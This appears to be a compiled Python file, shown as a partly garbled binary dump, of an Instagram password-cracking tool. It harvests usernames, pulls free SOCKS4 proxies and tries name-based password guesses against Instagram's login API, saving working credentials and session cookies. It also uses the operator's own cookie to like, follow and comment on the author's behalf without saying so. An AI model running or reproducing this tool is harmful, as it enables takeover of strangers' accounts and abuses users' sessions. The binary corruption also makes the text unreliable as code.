o

    *E�bw  �                   @   s  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d dl	m
Z
 d dlmZ dZdZ
dZdZd	Zd
ZdZdZd
�g e� �d�e� �d�e� �d�e
� �d�e� �d�e� �d�e
� �d�e
� �d�e� �d�e
� �d�e
� �d�e� �d�e
� �d�e
� �d�e� �d�e
� �d�e
� �d�e� �d�e
� �d�e
� �d�e� �d�e� �d�e
� �d�e
� �d��Zdd� Zdd � Zd!d"� Zd#d$� Zd%d&� Zd'd(� Zd)d*� Zd+d,� Zd-d.� Zd/d0� Zd1d2� Zd3d4� Z d5d6� Z!d7d8� Z"G d9d:� d:�Z#e$d;k�r	e �%d<� e�  dS dS )=�    N)�ThreadPoolExecutor)�ConnectionError)�sleepz[1;90mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;97m� z 
us   ╔════════════════════════════════════╗
u   ║z&HAI BG GUNAKAN SC INI DENGAN BENER YA �
us   ╚════════════════════════════════════╝
uj   ╔═════════════════════════════════╗
u   ║ z
FREE      zAuthor   : ONICHAN       z%GitHub   : https://github.com/onichanzFacebook : onichan      z
Versi    :z 2.0.2                uj   ╚═════════════════════════════════╝
c                  C   sN   t �  d} t| dd�}t� �|� t�d� td�}tdd��|� t	�  d S )Nz# L I S E N S I  I N V A L I DZred�Zstyle�   u   [•]Masukan Lisensi : �
.lisen.txt�w)
�banner�mark�sol�print�timer   �input�open�write�lisensi)�wel�wel2Zlisen� r   �temp.py�tlisensi   s   

r   c                  C   s�   z
t d��� } t�| � W n   t�  Y t�� }|�dtd  ��� }|d d }|| krNt	�  d}t
|dd�}t� �|� t
�d	� t�d
� t�  d S t�  d S )Nr	   z�https://app.cryptolens.io/api/key/Activate?token=WyIxOTE1MzM0NiIsIkdiOGJjU0pLanI2UWc4aU5XTXdNaThZbHF5SjlqVkJTNVAyRUtIZHUiXQ==&ProductId=15339&Key=r   Z
licenseKey�keyz# SELAMAT LISENSI KAMU VALID Zgreenr   r   Zsukses)r   �readZlisensikuni�appendr   �requests�Session�get�jsonr   r   r
   r   r   r   Z	lisensikuZlogin)Zcek�ses�resZstatusr   r   r   r   r   r   (   s"   



r   c                  C   s�  t �d� tt� tt� dt� dt� dt� dt� dt� dt� dt� d�� tt� dt� dt� dt� d	t	� d
�
�} | dv rZtt	� dt� dt	� dt� d
�� t
d� t �d� t�  d S | dv rptt� dt� dt� dt� d�� d S zKt�
d| �}tdd��|�d�� tjd|�d�� d�d| d�d��� d }tdd��| � tt� dt� dt� dt� dt	� d
|d � �� t�  W d S  ttfy�   tt� dt� dt� dt� d �� Y d S  ty�   tt� dt	� dt� dt	� d!�� Y d S w )"N�clear�[�   •�]zx Enter Instagram Cookies, You Should Use The Newly Created Account, If You Don't Know How To Get Instagram Cookies Type �Openr   �?�	 Cookie :� )r   r&   ZOPEN�!z8 You will be directed to the creator of this program !!!�   zMxdg-open https://wa.me/+6282277004825?text=Bg+Cara+Ambil+Cookies+Ig+Kek+Mana?�r   r)   z
 Do not Emptyzds_user_id=(.*?);�
Data/user.txtr
   �   �%https://i.instagram.com/api/v1/users/�/info/�  Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)��
user-agent�cookie��headers�user�
Data/coki.txt�*�
 Welcome :�	full_namez Make Sure Cookie Arw Fresh� Connection Error)�os�systemr   �
___logo___�B�P�Mr   �H�Kr   �exit�re�searchr   r   �groupr   r   r   �___follow___�AttributeError�KeyErrorr   )�	___cookieZ	___userid�___rozr   r   r   �___login___=   s"   
8&<$"::&&�rN   c            	      C   s�  �z3t dd��� } t�d| �}t�dg�}|dd�}t�� ��
}|jdi dd	�d
d�dd
�dd�dd�dd|�	d� �dd�dd�dd�dd�dd�dd �d!d"�d#d$�d%d&�d'd(�d)d*�d+�j
}|jd,i dd	�d
d�dd
�dd�dd�dd|�	d� �dd�dd�dd�dd�dd�dd �d!d"�d#d$�d%d&�d'd(�d)d*�d+�j
}|jd-i dd	�d
d�dd
�dd�dd�dd|�	d� �dd�dd�dd�dd�dd�dd �d!d"�d#d$�d%d&�d'd(�d)d*�|d.�j
}d/t|�v r�tt
� d0t� d1t
� d2t� d3�� t�  n%tt� d0t� d1t� d2t� d4�� td5� t�d6� t�  W d   � W d S W d   � W d S 1 �s-w   Y  W d S  t�yd } z#tt� d0t� d1t� d2t� d4�� td5� t�d6� t�  W Y d }~d S d }~ww )7Nr8   �rzsessionid=(.*?);u   Hello And Welcome ❤️r   )Zcomment_textZreplied_to_comment_idz=https://www.instagram.com/web/likes/2734317205115382629/like/Zacceptz*/*zaccept-encodingzgzip, deflate, brzaccept-languagezen-US,en;q=0.9zcontent-length�0zcontent-typez!application/x-www-form-urlencodedr4   z�ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; sessionid=r.   �originzhttps://www.instagram.comZreferer�https://www.instagram.com/zsec-fetch-dest�emptyzsec-fetch-modeZcorszsec-fetch-sitezsame-originr3   zsMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36�x-csrftokenZ W4fsZmCjUjFms6XmKl1OAjg8v81jZt3rzx-ig-app-idZ
5398218083zx-ig-www-claimz5hmac.AR0OQY4Gw4kczWNvfVOhvoljSINqB2u2gB-utUQ1MF0Mkrzuzx-instagram-ajaxZ95bfef5dd816zx-requested-with�XMLHttpRequestr5   z<https://www.instagram.com/web/friendships/5398218083/follow/z?https://www.instagram.com/web/comments/2734317205115382629/add/)r6   �dataz
"status":"ok"r#   r*   r%   z Login Success� Cookie Invalidr+   zrm -rf Data/coki.txt)r   r   rF   rG   �random�choicer   r   �postrH   �text�strr   rC   rA   �
___menu___rB   r   r=   r>   rN   �	Exception)	rL   Z
___sessionZ___teksZ___datar    Z___likeZ	___followZ___komen�er   r   r   rI   P   s&   
���(:�(�F��rI   c                  C   s�  zmt �d� tt� tjdtdd��� � d�dtdd��� d�d	��� d
 } tt	� dt
� dt	� d
t
� dt� d| d � �� tt	� dt
� dt	� d
t
� dt� d| d � �� tt	� dt
� dt	� d
t
� dt� d| d � d�� W n\ ty�   tt
� dt
� dt
� d
t
� d�� td� t�  Y n= ty�   tt
� dt
� dt
� d
t
� d�� t �d� td� t�  Y n ty�   tt
� dt� dt
� d
t� d�� Y nw tt� dt
� dt� d
t	� d�� tt� dt
� dt� d
t	� dt
� d�
� tt� dt
� d t� d
t	� dt
� d!�
� tt� dt
� d"t� d
t	� dt
� d#�
� tt� dt
� d$t� d
t	� dt
� d%�
� tt� dt
� d&t� d
t	� dt
� d'�
� tt� dt
� d(t� d
t	� dt
� d)�
� tt� dt
� d*t� d
t	� d+t
� d,�
� tt� dt
� d-t� d
t� d.t
� dt� d/t
� d
t� �� tt� dt
� d0t� d
t� d1�� tt� dt
� d2t� d
t� d3t
� dt
� d4t
� d
t
� d�� tt� dt
� d5t� d
t
� d6t� d�
�}|d7v �r�t�  d S |d8v �r�t�  d S |d9v �r�t�  d S |d:v �r�t�  d S |d;v �r�t�  d S |d<v �r�t�  d S |d=v �r�t�  d S |d>v �r	t�  d S |d?v �rt�  d S |d@v �r�z�tdt� dt
� dt� d
t
� dA�	� tt� dt
� dt� d
t
� dB�� tt� dt
� d t� d
t
� dC�� tt	� dt
� d5t	� d
t
� d6t� d�
�}|d7v �rott
� d�� t �dD� n.|d8v �r�tt
� d�� t �dE� n|d9v �r�t�  ntt
� dt
� dt
� d
t
� dF�� W d S W d S W d S W d S    Y d S |dGv �r�tt
� dt� dt
� d
t� dH�� t �d� t�  d S tt
� dt� dt
� d
t
� dF�� d S )INr"   r/   r-   rO   r0   r1   r8   r2   r5   r7   r#   r9   r%   r:   r)   r;   � User :�username� Follower :Zfollower_countr   r*   rW   r+   z,rm -rf Data/coki.txt && rm -rf Data/user.txtr<   �1z Dump Username From Following�2z Dump Username From Z	Followers�3ZActivity�4ZHome�5ZHashtag�6ZSearch�7ZQuery�8z Dump User z
From Email�9z
 Start Crack ZFastrP   z List Total Crack�Az	 Log out ZExitr'   �	 Choose :�rc   Z01�rd   Z02�re   Z03�rf   Z04)rg   Z05)rh   Z06)ri   Z07)rj   Z08)rk   Z09)rP   Z00z	 Total Okz	 Total Cpz Return
zcat Results/Ok.txtzcat Results/Cp.txtz Wrong Input)�arl   z Delete Cookie...)r=   r>   r   r?   r   r   r   r   r   r@   rA   rD   �IOErrorrB   r   rN   rK   rE   rC   r   �___mengikuti___�___pengikut___�___activity___�
___beranda___�___hastag___�___search___�___query___�___email___�___proxy___r]   )rM   Z___pilihZ___hasilr   r   r   r]   a   s�   
8..42<$� &&&&&&&6 8&


















"  &


&�
4$r]   c               
   C   s`  z�t dt� dt� dt� dt� dt� d��} | d d� dv r.tt� dt� d	t� dt� d
�� n;tjd| � d�d
tdd��	� d�d��
� d d }tt� dt� dt� dt� dt� d|d � d�� |d �dd�d }t�
� ��}|jd|d � d�d
tdd��	� d�d��
� }|d D ]%}td| d��|d d |d  d � tt� |d � d|d � �� q�tdt� dt� d t� dt� d!�	� tt� dt� dt� dt� d"t� d#|� �� t t� dt� d$t� dt� �� t�  W d   � W d S 1 s�w   Y  W d S  t�y   tt� dt� d	t� dt� d%�� Y d S  t�y/   tt� dt� d	t� dt� d&�� Y d S w )'Nr   r#   r'   r%   r`   r)   r.   �
rc   rd   re   rf   rg   rh   ri   rj   rk   rP   r*   �
 use UsernamerR   �/?__a=1r1   r8   rO   r2   r5   �graphqlr7   � Name :r;   �_�.txt�+https://i.instagram.com/api/v1/friendships/�idz/following/?count=5000�users�Dump/rr   ra   �<=>r9   � Finished...� File Saved In :� Dump/�Returnz
 Dump Failr<   �r   rC   rA   rD   rE   rB   r   r   r   r   r   r   �replacer   r   r@   r]   rK   r   ��___userrM   �___filer    �___zak�zr   r   r   rt   �   �*   ("20
.( "*&&�&&�rt   c               
   C   s`  z�t dt� dt� dt� dt� dt� d��} | d d� dv r.tt� dt� d	t� dt� d
�� n;tjd| � d�d
tdd��	� d�d��
� d d }tt� dt� dt� dt� dt� d|d � d�� |d �dd�d }t�
� ��}|jd|d � d�d
tdd��	� d�d��
� }|d D ]%}td| d��|d d |d  d � tt� |d � d|d � �� q�tdt� dt� d t� dt� d!�	� tt� dt� dt� dt� d"t� d#|� �� t t� dt� d$t� dt� �� t�  W d   � W d S 1 s�w   Y  W d S  t�y   tt� dt� d	t� dt� d%�� Y d S  t�y/   tt� dt� d	t� dt� d&�� Y d S w )'Nr   r#   r'   r%   r`   r)   r.   r}   r*   r~   rR   r   r1   r8   rO   r2   r5   r�   r7   r�   r;   r�   r�   r�   r�   z/followers/?count=5000r�   r�   rr   ra   r�   r9   r�   � File Saved in :r�   r�   � Dump Failedr<   r�   r�   r   r   r   ru   �   r�   ru   c               
   C   s�  z�t dt� dt� dt� dt� dt� d���dd�} | dv r0tt� dt� d	t� dt� d
�� W d S tt� d�� tj	ddt
d
d��� d�d�}t�
d|j�}|D ]#}t
d|  d��|d d |d  d � t|d � d|d � �� qOtdt� dt� dt� dt� d�	� tt� dt� dt� dt� dt� d| � �� t t� dt� dt� dt� �� t�  W d S  ty� } ztt� dt� d	t� dt� d|� �	� W Y d }~d S d }~ww )Nr   r#   r'   r%   � Name File :r)   r�   r,   r*   � Fillz2https://www.instagram.com/accounts/activity/?__a=1r1   r8   rO   r2   r5   �'"username":"(.*?)","full_name":"(.*?)",r�   rr   r   r�   r.   r9   z Finisehd...r�   r�   r�   �r   rC   rA   rD   r�   rE   rB   r   r   r   r   r   rF   �findallr[   r   r@   r]   r^   )r�   rM   r�   r�   r_   r   r   r   rv   �   s"   0&("**2��rv   c                  C   s�  z�t dt� dt� dt� dt� dt� d���dd�} | dv r0tt� dt� d	t� dt� d
�� W d S tt� d�� tj	ddt
d
d��� d�d��� }|d D ]+}t
d|  d��
|d d d |d d  d � t|d d � d|d d � �� qLtdt� dt� dt� dt� d�	� tt� dt� dt� dt� dt� d| � �� t t� dt� dt� dt� �� t�  W d S  ty�   tt� dt� d	t� dt� d�� Y d S  ty�   tt� dt� d	t� dt� d�� Y d S w )Nr   r#   r'   r%   r�   r)   r�   r,   r*   r�   z/https://i.instagram.com/api/v1/feed/reels_tray/r1   r8   rO   r2   r5   Ztrayr�   rr   r7   ra   r�   r;   r9   r�   r�   r�   r�   r�   r<   )r   rC   rA   rD   r�   rE   rB   r   r   r   r   r   r   r   r@   r]   rK   r   )r�   rM   r�   r   r   r   rw   �   s"   0&"0$"**&&�rw   c               
   C   s  z�t dt� dt� dt� dt� dt� d���dd�} | d	v r-tt� dt� d
t� dt� d�� t t� dt� dt� dt� dt� d�
��dd
�}|d	v r[tt� dt� d
t� dt� d�� W d S tt� d�� tj	d| � d�dt
dd��� d�d�}t�
d|j�}|D ]#}t
d| d��|d d |d  d � t|d � d|d � �� q~tdt� dt� dt� dt� d�	� tt� dt� dt� dt� dt� d|� �� t t� dt� dt� dt� �� t�  W d S  t�y } ztt� dt� d
t� dt� d|� �	� W Y d }~d S d }~ww ) Nr   r#   r'   r%   z
 Hashtag :r)   �#r   r,   r*   r�   r�   r�   z'https://www.instagram.com/explore/tags/r   r1   r8   rO   r2   r5   r�   r�   rr   r   r�   r.   r9   r�   r�   r�   r�   r�   )Z___tagr�   rM   r�   r�   r_   r   r   r   rx   �   s(   0 .&&("**2��rx   c               
   C   s`  z�t dt� dt� dt� dt� dt� d��} | d d� dv r.tt� dt� d	t� dt� d
�� n;tjd| � d�d
tdd��	� d�d��
� d d }tt� dt� dt� dt� dt� d|d � d�� |d �dd�d }t�
� ��}|jd|d � d�d
tdd��	� d�d��
� }|d D ]%}td| d��|d d |d  d � tt� |d � d|d � �� q�tdt� dt� d t� dt� d!�	� tt� dt� dt� dt� d"t� d#|� �� t t� dt� d$t� dt� �� t�  W d   � W d S 1 s�w   Y  W d S  t�y   tt� dt� d	t� dt� d%�� Y d S  t�y/   tt� dt� d	t� dt� d&�� Y d S w )'Nr   r#   r'   r%   r`   r)   r.   r}   r*   z
 Use UsernamerR   r   r1   r8   rO   r2   r5   r�   r7   r�   r;   r�   r�   zFhttps://i.instagram.com/api/v1/fbsearch/accounts_recs/?target_user_id=r�   z&include_friendship_status=truer�   r�   rr   ra   r�   r9   r�   r�   r�   r�   r�   r<   )r   rC   rA   rD   rE   rB   r   r   r   r   r   r   r�   r   r   r]   rK   r   r�   r   r   r   ry     r�   ry   c                  C   s�  z�t dt� dt� dt� dt� dt� d��} | dv r,tt� dt� dt� dt� d	�� W d S tt� d�� | �dd
�d }tj	d| � d
�dt
dd��� d�d��� }|d D ]+}t
d| d��
|d d d |d d  d � t|d d � d|d d � �� qTtdt� dt� dt� dt� d�	� tt� dt� dt� dt� dt� d|� �� t t� dt� dt� dt� �� t�  W d S  ty�   tt� dt� dt� dt� d�� Y d S  ty�   tt� dt� dt� dt� d �� Y d S w )!Nr   r#   r'   r%   z Query :r)   r,   r*   r�   r�   r�   zFhttps://www.instagram.com/web/search/topsearch/?context=blended&query=z)&rank_token=0.3953592318270893&count=5000r1   r8   rO   r2   r5   r�   r�   rr   r7   ra   r�   r;   r9   r�   r�   r�   r�   r�   r<   )r   rC   rA   rD   rE   rB   r   r�   r   r   r   r   r   r   r@   r]   rK   r   )Z___queryr�   rM   r�   r   r   r   rz     s$   (&*0$"**&&�rz   c               
   C   s@  z�t dt� dt� dt� dt� dt� d���dd�} | dv r-tt� dt� d	t� dt� d
�� t t� dt� dt� dt� dt� d�
�}|dv r�tt t� dt� dt� dt� d
t� d�
��}|dkrptt� dt� d	t� dt� d�� W d S tt� d�� d|  d }t	|�D ]*}t
�dd�}| t|� | d |  d t|� }t
|d��|� d�� t|� � q�tdt� dt� dt� dt� d�	� tt� dt� dt� dt� dt� d|� �� t t� dt� dt� dt� �� t�  W d S tt� dt� d	t� dt� d�� W d S  t�y } ztt� dt� d	t� dt� d|� �	� W Y d }~d S d }~ww )Nr   r#   r'   r%   r�   r)   r   r,   r*   r�   z	 Domain :)z
@gmail.comz
@yahoo.comz@hotmail.comz
@email.comz	@mail.comz@outlook.comz@yandex.comz Limit :i�  z
 maximun 1000r�   r�   r.   i�  r�   rr   r9   r�   r�   r�   zf Domain '@gmail.com','@yahoo.com','@hotmail.com','@email.com','@mail.com','@outlook.com','@yandex.com')r   rC   rA   rD   r�   rE   rB   �intr   �rangerX   Zrandintr\   r   r   r@   r]   r^   )Z___namaZ	___domainZ___limitr�   r�   Z___nomorr�   r_   r   r   r   r{   1  s0   0 &*&$"**&2��r{   c               
   C   sl   zt �d�j} tdd��| � W n  ty0 } zt �d�j} tdd��| � W Y d }~nd }~ww t�  d S )Nzwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all�Data/proxy.txtr
   zIhttps://raw.githubusercontent.com/MN4WN1-777/ignew/master/Data/proxy2.txt)r   r   r[   r   r   r^   �___crack___)rM   r_   r   r   r   r|   K  s   ��
r|   c                   @   s   e Zd Zdd� Zdd� ZdS )r�   c           	      C   s�  d| _ g | _g | _tdt� dt� dt� dt� dt� dt� dt� dt� �� tt� dt� dt� dt� dt� dt� d	t� dt� �� tt� dt� d
t� dt� dt� dt� dt� dt� �� tt� dt� dt� dt� d
t� dt� dt� dt� d�� t	t� dt� dt� dt� dt� d�
�}|dv r�t	t� dt� dt� dt� dt� d�
��
d�}z!t	t� dt� dt� dt� dt� d�
�| _t| jd��
� �� | _W n ty�   tt� dt� dt� dt� d�� Y nw z�tdt� dt� dt� dt� d�	� tt� dt� dt� dt� d�� tdd���}| jD ]�}|�
d�\}}|�
d�}|dv �r0|�dd �||d d! |d d" g}n^|d#v �rM|�dd �||d d! |d d$ |d d" g}nA|d%v �ro|�dd �||d d! |d d$ |d d" |d d& g}n|dv �rw|}n|�dd �||d d! |d d$ |d d" g}|�| j| j||� �q
W d   � n	1 �s�w   Y  tdt� dt� d't� dt� �� W d S  t�y�   tt� dt� dt� dt� d(�� Y d S w ))Nr   r   r#   rc   r%   z Enter Password zName, Name123, Name12345rd   z"name, name123, name1234, name12345re   z.name, name123, name1234, name12345, name123456rf   z Enter Password Manual z>5r'   rm   r)   rq   � Password :�,z File Dump :rO   r*   z File Not Foundr$   z! Total Ok Saved Di Results/Ok.txtz" Total Cp Saved Di Results/Cp.txt
�   )�max_workersr�   rn   r   Z123Z12345ro   Z1234rp   Z123456ZFinishedz? Crack is complete, there seems to be an error, please re-dump!)�kill�ok�cpr   rD   rB   rA   r@   rC   r   �splitZ_crack______dumpr   r   �
splitlinesZ_crack______filers   rE   r   r�   Zsubmit�__main__�
ValueError)	�selfZ_crack______pilih�pwxZ_crack______hayukZ_crack______userra   Znamar�   �passwordr   r   r   �__init__V  sN   8668&,($�" 


&
0
:
.��&&�z___crack___.__init__c                 C   s�  z	t dd��� }W n ty   d}Y nw �z�|D �]h}|�� }d}d}ddt�t dd��� �� � i}t�|�j	d	 }	|d
t
� d|� �i dd
�}
t�t dd��� �� �dd|	d�}t�� ��}|j||
||d��
� }
dt|
�v �rxd|j	�� d � d|j	�� d � d|j	�� d	 � d|j	�� d � d|j	�� d � d�}z'tjd|� d�dt dd��� d �d!��
� d" d# }|d$ d% }|d& d% }W n ttfy�   d'}d'}Y n   Y td(t� d)t� d*t� d+t� d,t� d-�� tt� d)t� d.t� d+t� d/t� d0|� �� tt� d)t� d.t� d+t� d1t� d0|� �� tt� d)t� d.t� d+t� d2t� d0|� �� tt� d)t� d.t� d+t� d3t� d0|� �� tt� d)t� d.t� d+t� d4t� d0|� d5�� | j�|� d6|� �� t d7d8��|� d6|� d5�� 	 W d   �  �nd9t|
�v �rEz'tjd|� d�dt dd��� d �d!��
� d" d# }|d$ d% }|d& d% }W n ttf�y�   d'}d'}Y n   Y td(t� d)t� d:t� d+t� d,t� d;�� tt� d)t� d.t� d+t� d/t� d0|� �� tt� d)t� d.t� d+t� d1t� d0|� �� tt� d)t� d.t� d+t� d2t� d0|� �� tt� d)t� d.t� d+t� d3t� d0|� d5�� | j�|� d6|� �� t d<d8��|� d6|� d5�� 	 W d   �  n>d=t|
�v �rjtt� d)t� d>t� d+t� d?�d(d@� tdA� t| |||� n	 W d   � qW d   � n	1 �s}w   Y  q|  jdB7  _tt� d)t� dCt� d+t� d0| j� dDtt|��� dEt| j�� dFt| j�� dG�d(d@� W d S  t�y�   tt� d)t� d>t� d+t� dH�d(d@� tdA� t| |||� Y d S    t| |||� Y d S )INzData/ua.txtrO   z�Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36z https://z-p42.www.instagram.com/z4https://z-p42.www.instagram.com/accounts/login/ajax/�httpzsocks4://%sr�   Z	csrftokenz#PWD_INSTAGRAM_BROWSER:0:�:Zfalse)ra   Zenc_passwordZqueryParamsZ
optIntoOneTaprU   z6https://z-p42.www.instagram.com/api/v1/accounts/login/)z
User-AgentzX-Requested-WithZRefererrT   )rV   r6   ZproxiesZuserIdzmid=Zmidz;ig_did=Zig_didz�;ig_nrcb=1;shbid="9776,1986587953,1674289809:01f713acdf5c4921a542aff43695805d8e788f5580f4efaaf714ca7301ba34bb727790c9";shbts="1642753809,1986587953,1674289809:01f7227f6219fb0a036e3593c1531e9b9c9eb1db9dcbb7b4590ba36ffcbe62715eb10ada";csrftoken=z;ds_user_id=Z
ds_user_idz;sessionid=Z	sessionidzi;rur="EAG,1986587953,1674477820:01f724c03ff38f24662b1648dd2a933fc4a6e66b7a2bef2458d140bfb76ee86296f6cd8b"r   r1   r8   r2   r5   r�   r7   Zedge_followed_by�countZedge_follow�-�
r#   u   ✔r%   z	 Status :z onichan Success     �>z Username :r)   r�   rb   z Following :r(   r   �|zResults/Ok.txtrr   Zcheckpoint_requiredu   ✘z onichan Checkpoint    zResults/Cp.txtzPlease waitr*   z- IP Terkena Spam Nyalakan Mode Pesawat 2detik)�end�   r.   ZOnichan�/z Cp:-z Ok:-z
          z  connection Error               ) r   r   rs   �lowerrX   rY   r�   r   r   Zcookiesr   r   rZ   r   r\   Zget_dictrK   r   r@   rA   rC   r�   r   r   rD   r�   rB   r   r�   r�   �lenr   )r�   r7   �uidr�   Z_crack______useragentZpwZ_crack______urlZ_crack______loginZ_crack______proxyZ_crack______csrfZ_crack______dataZ_crack______headr    ZresponseZcokiZ_crack______rozZfollowerZ	followingr   r   r   r�   {  s�   �
 ��V2(****,�2(***,�&<�'��*X@z___crack___.__main__N)�__name__�
__module__�__qualname__r�   r�   r   r   r   r   r�   T  s    %r�   r�   zgit pull)&r=   rF   �sysr   r   rX   r   �concurrent.futuresr   Zrequests.exceptionsr   r   rC   rB   rD   �T�Ur@   rA   �joinr?   r   r   rN   rI   r]   rt   ru   rv   rw   rx   ry   rz   r{   r|   r�   r�   r>   r   r   r   r   �<module>   s�   8 ������������������	�	�	�	�
�@	
k

�